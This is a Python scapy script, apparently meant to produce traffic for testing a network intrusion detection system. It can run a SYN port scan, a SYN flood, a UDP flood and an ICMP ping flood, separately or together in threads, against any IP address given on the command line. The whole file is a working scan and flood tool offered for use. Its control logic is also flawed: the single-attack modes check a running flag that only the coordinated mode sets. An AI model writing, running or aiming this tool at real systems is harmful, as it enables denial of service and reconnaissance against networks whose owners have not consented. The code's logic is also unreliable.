#!/usr/bin/env python3
"""
Real Network Packet Attack Script
Sends actual network packets that NIDS can capture and classify
"""

import socket
import struct
import time
import random
import threading
import argparse
from scapy.all import *

class RealPacketAttacker:
    """Sends real network packets for NIDS detection."""
    
    def __init__(self, target_ip: str):
        self.target_ip = target_ip
        self.packets_sent = 0
        self.running = False
    
    def port_scan_attack(self, duration: int = 30):
        """Real port scanning - sends actual SYN packets."""
        print(f"🔍 Starting REAL port scan attack for {duration}s")
        
        # Common ports to scan
        ports = [21, 22, 23, 25, 53, 80, 110, 135, 139, 143, 443, 993, 995, 1723, 3306, 3389, 5432, 5900]
        
        start_time = time.time()
        
        while time.time() - start_time < duration and self.running:
            port = random.choice(ports)
            
            try:
                # Create SYN packet for port scan
                packet = IP(dst=self.target_ip)/TCP(dport=port, flags="S")
                send(packet, verbose=0)
                
                self.packets_sent += 1
                print(f"   📡 SYN scan to port {port}")
                
                time.sleep(0.1)  # 100ms between scans
                
            except Exception as e:
                print(f"   ❌ Failed to send to port {port}: {e}")
        
        print(f"✅ Port scan complete: {self.packets_sent} packets sent")
    
    def ddos_syn_flood(self, duration: int = 20):
        """Real SYN flood attack - sends actual SYN packets rapidly."""
        print(f"🔥 Starting REAL SYN flood attack for {duration}s")
        
        start_time = time.time()
        
        while time.time() - start_time < duration and self.running:
            try:
                # Random source port for each packet
                src_port = random.randint(1024, 65535)
                
                # Create SYN flood packet
                packet = IP(dst=self.target_ip)/TCP(sport=src_port, dport=80, flags="S")
                send(packet, verbose=0)
                
                self.packets_sent += 1
                
                if self.packets_sent % 50 == 0:
                    print(f"   🚨 SYN flood: {self.packets_sent} packets sent")
                
                time.sleep(0.01)  # 10ms between packets (high rate)
                
            except Exception as e:
                print(f"   ❌ SYN flood error: {e}")
                break
        
        print(f"✅ SYN flood complete: {self.packets_sent} packets sent")
    
    def udp_flood_attack(self, duration: int = 15):
        """Real UDP flood attack."""
        print(f"🌊 Starting REAL UDP flood attack for {duration}s")
        
        # Common UDP ports
        udp_ports = [53, 123, 161, 1900, 5353]
        
        start_time = time.time()
        
        while time.time() - start_time < duration and self.running:
            try:
                port = random.choice(udp_ports)
                payload_size = random.randint(100, 1400)
                payload = bytes([random.randint(0, 255) for _ in range(payload_size)])
                
                # Create UDP flood packet
                packet = IP(dst=self.target_ip)/UDP(dport=port)/Raw(load=payload)
                send(packet, verbose=0)
                
                self.packets_sent += 1
                
                if self.packets_sent % 30 == 0:
                    print(f"   💥 UDP flood: {self.packets_sent} packets sent")
                
                time.sleep(0.02)  # 20ms between packets
                
            except Exception as e:
                print(f"   ❌ UDP flood error: {e}")
                break
        
        print(f"✅ UDP flood complete: {self.packets_sent} packets sent")
    
    def icmp_ping_flood(self, duration: int = 10):
        """Real ICMP ping flood."""
        print(f"📡 Starting REAL ICMP ping flood for {duration}s")
        
        start_time = time.time()
        
        while time.time() - start_time < duration and self.running:
            try:
                # Create ICMP ping packet
                packet = IP(dst=self.target_ip)/ICMP()
                send(packet, verbose=0)
                
                self.packets_sent += 1
                
                if self.packets_sent % 20 == 0:
                    print(f"   🏓 ICMP flood: {self.packets_sent} packets sent")
                
                time.sleep(0.05)  # 50ms between pings
                
            except Exception as e:
                print(f"   ❌ ICMP flood error: {e}")
                break
        
        print(f"✅ ICMP flood complete: {self.packets_sent} packets sent")
    
    def coordinated_attack(self, duration: int = 60):
        """Launch multiple real attack vectors simultaneously."""
        print(f"🎭 Starting REAL coordinated attack for {duration}s")
        print("   This sends actual network packets your NIDS can detect!")
        
        self.running = True
        
        # Launch different attack types in parallel
        attacks = [
            threading.Thread(target=self.port_scan_attack, args=(duration//3,)),
            threading.Thread(target=self.ddos_syn_flood, args=(duration//4,)),
            threading.Thread(target=self.udp_flood_attack, args=(duration//4,)),
            threading.Thread(target=self.icmp_ping_flood, args=(duration//6,))
        ]
        
        print("🚀 Launching real packet attacks...")
        for i, attack in enumerate(attacks):
            attack.start()
            time.sleep(2)  # Stagger attacks
            print(f"   Vector {i+1} launched")
        
        # Wait for completion
        for attack in attacks:
            attack.join()
        
        self.running = False
        print("✅ Coordinated real packet attack complete")
    
    def print_stats(self):
        """Print attack statistics."""
        print(f"\n📊 Real Packet Attack Statistics:")
        print(f"   Total Packets Sent: {self.packets_sent}")
        print(f"   Target: {self.target_ip}")
        print(f"   Attack Type: Real network packets")

def main():
    """Main attack function."""
    parser = argparse.ArgumentParser(description="Real Network Packet Attack Script")
    parser.add_argument("target_ip", help="Target IP address")
    parser.add_argument("--attack", choices=[
        "port-scan", "ddos", "udp-flood", "icmp-flood", "coordinated"
    ], default="coordinated", help="Attack type")
    parser.add_argument("--duration", type=int, default=30, help="Attack duration in seconds")
    
    args = parser.parse_args()
    
    print("🕷️ Real Network Packet Attack Script")
    print("=" * 50)
    print(f"🎯 Target: {args.target_ip}")
    print(f"⚔️  Attack: {args.attack}")
    print(f"⏱️  Duration: {args.duration}s")
    print("🚨 SENDING REAL NETWORK PACKETS!")
    print("=" * 50)
    
    # Initialize attacker
    attacker = RealPacketAttacker(args.target_ip)
    
    print(f"\n🚀 Starting {args.attack} attack...")
    print("💡 Your NIDS should detect these REAL packets!")
    
    try:
        if args.attack == "port-scan":
            attacker.port_scan_attack(args.duration)
        elif args.attack == "ddos":
            attacker.ddos_syn_flood(args.duration)
        elif args.attack == "udp-flood":
            attacker.udp_flood_attack(args.duration)
        elif args.attack == "icmp-flood":
            attacker.icmp_ping_flood(args.duration)
        elif args.attack == "coordinated":
            attacker.coordinated_attack(args.duration)
    
    except KeyboardInterrupt:
        print("\n🛑 Attack interrupted by user")
        attacker.running = False
    except Exception as e:
        print(f"\n❌ Attack failed: {e}")
        print("💡 Try running as administrator for raw packet access")
    
    # Print results
    attacker.print_stats()
    print("\n🎉 Real packet attack complete!")
    print("💻 Check your NIDS for real attack detection!")
    
    return 0

if __name__ == "__main__":
    exit(main())